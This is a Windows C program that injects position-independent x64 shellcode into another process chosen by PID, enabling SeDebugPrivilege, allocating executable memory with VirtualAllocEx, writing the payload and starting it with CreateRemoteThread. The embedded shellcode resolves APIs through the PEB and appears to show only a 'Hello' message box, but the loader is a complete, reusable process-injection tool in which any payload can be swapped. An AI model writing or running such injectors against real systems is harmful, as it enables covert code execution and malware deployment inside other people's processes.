#include <Windows.h>
#include <tchar.h>
#include <stdio.h>


BYTE shellcode[] =
"\x48\x89\x5c\x24\x08\x48\x89\x74\x24\x10\x57\x48\x83\xec\x20\x65"
"\x48\x8b\x04\x25\x30\x00\x00\x00\x41\xb9\xdf\xff\x00\x00\x48\x8b"
"\x48\x60\x48\x8b\x41\x18\x4c\x8b\x40\x20\x49\x8b\xd0\x48\x8b\x12"
"\x48\x8b\x4a\x40\x0f\xb7\x41\x28\x66\x83\xe8\x4b\x66\x41\x85\xc1"
"\x75\x58\x0f\xb7\x41\x2a\x66\x83\xe8\x45\x66\x41\x85\xc1\x75\x4a"
"\x0f\xb7\x41\x2c\x66\x83\xe8\x52\x66\x41\x85\xc1\x75\x3c\x0f\xb7"
"\x41\x2e\x66\x83\xe8\x4e\x66\x41\x85\xc1\x75\x2e\x0f\xb7\x41\x30"
"\x66\x83\xe8\x45\x66\x41\x85\xc1\x75\x20\x0f\xb7\x41\x32\x66\x83"
"\xe8\x4c\x66\x41\x85\xc1\x75\x12\x66\x83\x79\x34\x33\x75\x0b\x66"
"\x83\x79\x36\x32\x0f\x84\x81\x00\x00\x00\x49\x3b\xd0\x75\x8e\x33"
"\xff\xba\x76\x2c\x1d\x07\x48\x8b\xcf\xe8\x7a\x00\x00\x00\xba\x5a"
"\xc1\xcb\xc2\x48\x8b\xcf\x48\x8b\xd8\xe8\x6a\x00\x00\x00\x48\x8b"
"\xf0\x48\x8d\x15\x30\x01\x00\x00\x48\x8b\xcf\xff\xd6\x48\x8d\x0d"
"\x34\x01\x00\x00\x48\x8b\xf8\xff\xd3\x48\x85\xc0\x74\x26\x48\x8d"
"\x15\x33\x01\x00\x00\x48\x8b\xc8\xff\xd6\x48\x85\xc0\x74\x15\x45"
"\x33\xc9\x4c\x8d\x05\x2f\x01\x00\x00\x48\x8d\x15\x30\x01\x00\x00"
"\x33\xc9\xff\xd0\x33\xc9\x48\x8b\xc7\x48\x8b\x5c\x24\x30\x48\x8b"
"\x74\x24\x38\x48\x83\xc4\x20\x5f\x48\xff\xe0\x48\x8b\x7a\x20\xeb"
"\x80\x00\x00\x00\x00\x00\x00\x00\x48\x89\x74\x24\x08\x48\x89\x7c"
"\x24\x10\x48\x63\x41\x3c\x4c\x8b\xc1\x8b\xf2\x44\x8b\x94\x08\x88"
"\x00\x00\x00\x4c\x03\xd1\x45\x8b\x4a\x20\x41\x8b\x7a\x1c\x4c\x03"
"\xc9\x48\x03\xf9\x33\xc9\x41\x3b\x4a\x18\x73\x33\x41\x8b\x11\x49"
"\x03\xd0\x45\x33\xdb\xeb\x0d\x45\x6b\xdb\x21\x0f\xbe\xc0\x44\x03"
"\xd8\x48\xff\xc2\x8a\x02\x84\xc0\x75\xed\x44\x3b\xde\x74\x0c\xff"
"\xc1\x49\x83\xc1\x04\x41\x3b\x4a\x18\x72\xd1\x41\x3b\x4a\x18\x74"
"\x15\x8b\xd1\x41\x8b\x4a\x24\x49\x03\xc8\x0f\xb7\x04\x51\x8b\x04"
"\x87\x49\x03\xc0\xeb\x02\x33\xc0\x48\x8b\x74\x24\x08\x48\x8b\x7c"
"\x24\x10\xc3\x00\x00\x00\x00\x00\x01\x0a\x04\x00\x0a\x74\x02\x00"
"\x05\x64\x01\x00\x00\x00\x00\x00\x28\x01\x00\x00\xb3\x01\x00\x00"
"\xb8\x01\x00\x00\x00\x00\x00\x00\x01\x0f\x06\x00\x0f\x64\x07\x00"
"\x0f\x34\x06\x00\x0f\x32\x0b\x70\x00\x00\x00\x00\x21\x01\x00\x00"
"\xd8\x01\x00\x00\x00\x00\x00\x00\x45\x78\x69\x74\x54\x68\x72\x65"
"\x61\x64\x00\x00\x00\x00\x00\x00\x55\x73\x65\x72\x33\x32\x2e\x64"
"\x6c\x6c\x00\x00\x00\x00\x00\x00\x4d\x65\x73\x73\x61\x67\x65\x42"
"\x6f\x78\x41\x00\x00\x00\x00\x00\x4d\x65\x73\x73\x61\x67\x65\x00"
"\x48\x65\x6c\x6c\x6f\x00";


BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege);

int _tmain(int argc, TCHAR* argv[]) {

	if (argc != 2) {
		_tprintf(_T("[!] Usage: main.exe [pid]\n"));
		return 0;
	}

	DWORD PID = _tstoi(argv[1]);
	if (PID == 0) {
		_tprintf(_T("[x] Invalid PID\n"));
		return 0;
	}

	HANDLE hToken;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		SetPrivilege(hToken, SE_DEBUG_NAME, TRUE);
		CloseHandle(hToken);
	}

	HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, PID);
	if (hProcess == NULL) {
		_tprintf(_T("[x] OpenProcess failed, error: 0x%x\n"), GetLastError());
		return 0;
	}

	PVOID Buffer = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	if (Buffer == NULL) {
		_tprintf(_T("[x] VirtualAllocEx failed, error: 0x%x\n"), GetLastError());
		CloseHandle(hProcess);
		return 0;
	}

	SIZE_T bytesWritten;
	WriteProcessMemory(hProcess, Buffer, shellcode, sizeof(shellcode), &bytesWritten);
	if (bytesWritten != sizeof(shellcode)) {
		_tprintf(_T("[x] WriteProcessMemory failed, error: 0x%x\n"), GetLastError());
		CloseHandle(hProcess);
		return 0;
	}

	DWORD ThreadId;
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)Buffer, NULL, 0, &ThreadId);
	if (hThread == NULL) {
		_tprintf(_T("[x] CreateRemoteThread failed, error: 0x%x\n"), GetLastError());
		CloseHandle(hProcess);
		return 0;
	}

	_tprintf(_T("[+] Success, ThreadId = 0x%x (%d)\n"), ThreadId, ThreadId);

	CloseHandle(hProcess);
	CloseHandle(hThread);

	return 0;
}

BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) {

	LUID luid;
	BOOL bRet = FALSE;

	if (LookupPrivilegeValue(NULL, lpszPrivilege, &luid))
	{
		TOKEN_PRIVILEGES tp;

		tp.PrivilegeCount = 1;
		tp.Privileges[0].Luid = luid;
		tp.Privileges[0].Attributes = (bEnablePrivilege) ? SE_PRIVILEGE_ENABLED : 0;
		//
		//  Enable the privilege or disable all privileges.
		//
		if (AdjustTokenPrivileges(hToken, FALSE, &tp, NULL, (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
		{
			//
			//  Check to see if you have proper access.
			//  You may get "ERROR_NOT_ALL_ASSIGNED".
			//
			bRet = (GetLastError() == ERROR_SUCCESS);
		}
	}
	return bRet;
}
